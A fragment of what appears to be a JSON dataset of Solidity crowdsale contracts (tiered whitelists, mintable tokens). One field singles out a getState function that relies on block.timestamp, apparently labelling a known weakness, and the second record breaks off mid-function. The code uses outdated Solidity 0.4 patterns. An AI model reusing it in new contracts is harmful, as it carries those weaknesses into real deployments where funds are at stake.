SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f96"
  },
  "filename": "9802.sol",
  "content": "pragma solidity ^0.4.11;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function 